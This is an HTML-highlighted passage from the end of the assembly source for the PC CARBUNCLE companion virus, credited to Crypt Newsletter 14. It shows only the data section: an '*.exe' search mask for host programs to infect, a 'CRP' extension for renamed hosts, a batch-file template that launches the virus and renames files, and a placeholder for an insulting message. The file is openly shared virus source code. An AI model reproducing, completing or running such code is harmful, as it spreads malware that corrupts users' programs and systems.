</span><span class="sc5">Vict_ext</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;&lt;----searchmask for hosts to CARBUNCL-ize</span><span class="sc0">
</span><span class="sc5">moc_ext</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CRP"</span><span class="sc0">       </span><span class="sc1">; new extent for CARBUNCL-ized hosts</span><span class="sc0">
</span><span class="sc5">blank</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"        "</span><span class="sc0">  </span><span class="sc1">;blanks for filling batchfile</span><span class="sc0">
</span><span class="sc5">S_bat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"@ECHO OFF"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0"> </span><span class="sc1">; &lt;--batchfile command lines</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CARBUNCL"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">  </span><span class="sc1">; call PC CARBUNCL shadow virus</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RENAME "</span><span class="sc0">
</span><span class="sc5">moc1</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc12">' '</span><span class="sc0">
</span><span class="sc5">com1</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">com2</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc3">"RENAME "</span><span class="sc0">
</span><span class="sc5">com3</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc12">' '</span><span class="sc0">
</span><span class="sc5">moc2</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc3">"CARBUNCL"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">01Ah</span><span class="sc0"> </span><span class="sc1">;&lt;---put dumb message here</span><span class="sc0">
</span><span class="sc5">L_bat</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">; format "ECHO Fuck you lamer"</span><span class="sc0">
</span><span class="sc5">note</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc3">"PC CARBUNCLE: Crypt Newsletter 14"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">bat_name</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; on the fly workspace </span><span class="sc0">
</span><span class="sc5">rename_name</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">orig_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">),</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Last</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;&lt;---- end of virus place-holder</span><span class="sc0">


</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">



</span></div></body>
</html>
